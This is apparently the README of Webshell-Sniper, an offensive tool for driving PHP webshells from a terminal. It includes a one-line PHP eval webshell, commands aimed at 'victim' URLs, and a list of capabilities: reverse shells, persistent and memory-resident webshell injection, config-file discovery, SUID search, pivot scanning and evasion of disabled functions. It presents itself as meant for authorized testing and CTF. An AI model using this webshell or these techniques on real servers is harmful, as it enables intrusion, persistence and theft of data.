# Webshell-Sniper

A webshell manager via the terminal — for **authorized** penetration testing,
security research and CTF.

[![CI](https://github.com/WangYihang/Webshell-Sniper/actions/workflows/ci.yml/badge.svg)](https://github.com/WangYihang/Webshell-Sniper/actions/workflows/ci.yml)
[![Backers on Open Collective](https://opencollective.com/Webshell-Sniper/backers/badge.svg)](#backers)
[![Sponsors on Open Collective](https://opencollective.com/Webshell-Sniper/sponsors/badge.svg)](#sponsors)

Given a PHP webshell that is already on a target (a one-liner such as
`<?php @eval($_POST['c']); ?>`), Webshell-Sniper turns it into a rich,
interactive console: command execution, recon, file transfer, a MySQL client,
pivot port-scanning, reverse shells and secondary-shell injection.

> ## ⚠️ Legal & authorized use only
>
> This is an offensive-security tool. Use it **only** against systems you own
> or have **explicit, written permission** to test. Unauthorized access to
> computer systems is illegal in most jurisdictions. The authors accept no
> liability for misuse.

---

## Requirements

- Python **3.10+**
- A reachable PHP webshell that evaluates a request parameter (`eval`-style)

## Installation

With [uv](https://docs.astral.sh/uv/) (recommended):

```bash
git clone https://github.com/WangYihang/Webshell-Sniper
cd Webshell-Sniper
uv sync                      # creates the venv and installs everything
uv run webshell-sniper --help
```

Or as a normal package:

```bash
pip install .                # add '.[mount]' for the FUSE mount feature
webshell-sniper --help
```

## Quick start

```bash
# url, http method, password parameter
webshell-sniper http://victim/c.php POST s3cr3t

# route everything through Burp / a SOCKS proxy, ignore a self-signed cert
webshell-sniper --proxy http://127.0.0.1:8080 --insecure http://victim/c.php POST s3cr3t

# manage several shells at once
webshell-sniper -f webshells.json
```

`webshells.json` is a list of endpoints:

```json
[
  {"url": "http://127.0.0.1/c.php", "method": "POST", "password": "c"},
  {"url": "http://127.0.0.1/d.php", "method": "GET",  "password": "d"}
]
```

## Interactive commands

| Command | Description |
|---------|-------------|
| `p` / `print` | Print target info (webroot, PHP & kernel version) |
| `pv`, `kv` | PHP version / kernel version |
| `c` | Find config / database files in the webroot |
| `r` / `read` | Read a remote file |
| `rm` | Delete a remote file (no argument → the shell deletes itself) |
| `fwd`, `fwpf` | Find writable directories / writable PHP files |
| `gdf` | List PHP `disable_functions` |
| `fsb` | Find SUID-root binaries |
| `ps` | Port-scan a CIDR range *from the target* |
| `dl`, `dla` | Download a file/tree (`dla` = custom `find` args) |
| `rsh` | Reverse shell (socat → nc → bash fallback) |
| `db` | MySQL manager |
| `aiw`, `aimw` | Inject a webshell / memory-resident webshell (random per-directory password) |
| `fr` | Flag reaper (CTF) |
| `setl` / `setr` | Run unrecognized input on **l**ocalhost / **r**emote target |
| `exec <cmd>` | Explicitly run a command on the target |
| `help`, `q` | Help / quit |

Anything not recognized as a command is executed as a shell command — locally
by default, or on the target after `setr`. cmd2 gives you history (↑/↓),
`Tab` completion and `help <command>`.

## Command execution & evasion notes

- Payloads are base64-encoded and run via `eval(base64_decode(...))`, so quotes,
  newlines and binary data survive transport intact (no fragile string
  interpolation).
- Command execution automatically picks the first **non-disabled** function from
  `system → passthru → shell_exec → exec → popen → proc_open`, so a target that
  disables `system()` still works.

## Local test target

A disposable, intentionally-vulnerable PHP container lives in [`docker/`](docker/):

```bash
docker compose -f docker/docker-compose.yml up -d
webshell-sniper http://127.0.0.1:8080/index.php POST c
```

## Development

```bash
uv sync
uv run ruff check src tests     # lint
uv run mypy                     # type-check
uv run pytest                   # unit + integration (integration needs `php`)
```

Integration tests spin up their own `php -S` target and are skipped when `php`
is not installed. A pre-commit config is provided (`pre-commit install`).

## Contributors

This project exists thanks to all the people who contribute.

<a href="https://github.com/WangYihang/Webshell-Sniper/graphs/contributors"><img src="https://opencollective.com/Webshell-Sniper/contributors.svg?width=890&button=false" /></a>

## Backers

Thank you to all our backers! 🙏 [[Become a backer](https://opencollective.com/Webshell-Sniper#backer)]

<a href="https://opencollective.com/Webshell-Sniper#backers" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/backers.svg?width=890"></a>

## Sponsors

Support this project by becoming a sponsor. [[Become a sponsor](https://opencollective.com/Webshell-Sniper#sponsor)]

## License

See [LICENSE](LICENSE).
